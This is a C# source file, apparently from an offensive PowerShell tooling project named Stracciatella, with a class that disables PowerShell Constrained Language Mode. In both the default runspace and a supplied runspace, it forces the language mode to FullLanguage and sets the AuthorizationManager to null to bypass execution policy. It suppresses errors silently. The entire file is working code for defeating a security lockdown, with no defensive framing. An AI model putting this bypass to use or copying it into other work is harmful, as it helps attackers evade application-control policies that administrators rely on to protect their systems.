using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Reflection;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation.Runspaces;

namespace Stracciatella
{
    class DisableClm
    {
        private static bool Verbose = false;

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern int GetCurrentThreadId();

        private static bool ClmDisabler(PowerShell rs)
        {
            bool ret = false;

            if (DisableClm.Verbose) Console.WriteLine("[+] Disabling CLM globally.");
            if (DisableClm.Verbose)
            {
                Console.WriteLine("\tCurrent thread ID (managed/unmanaged): " + System.Threading.Thread.CurrentThread.ManagedThreadId.ToString() + " / " + GetCurrentThreadId().ToString());
            }

            try
            {            
                // Switches back to FullLanguage in CLM
                Runspace.DefaultRunspace.SessionStateProxy.LanguageMode = PSLanguageMode.FullLanguage;
                Runspace.DefaultRunspace.InitialSessionState.LanguageMode = PSLanguageMode.FullLanguage;

                // Bypasses PowerShell execution policy
                Runspace.DefaultRunspace.InitialSessionState.AuthorizationManager = null;
                ret |= true;
            }
            catch (Exception e)
            {
                //if (DisableClm.Verbose) Console.WriteLine("[-] Approach #1 failed: " + e);
            }

            try
            {
                rs.Runspace.SessionStateProxy.LanguageMode = PSLanguageMode.FullLanguage;
                rs.Runspace.InitialSessionState.AuthorizationManager = null;
                rs.Runspace.InitialSessionState.LanguageMode = PSLanguageMode.FullLanguage;
                ret |= true;
            }
            catch (Exception e)
            {
                //if (DisableClm.Verbose) Console.WriteLine("[-] Approach #2 failed: " + e);
            }

            return ret;
        }

        public static bool DoDisable(PowerShell rs, bool verb)
        {
            DisableClm.Verbose = verb;
            return ClmDisabler(rs);
        }
    }
}
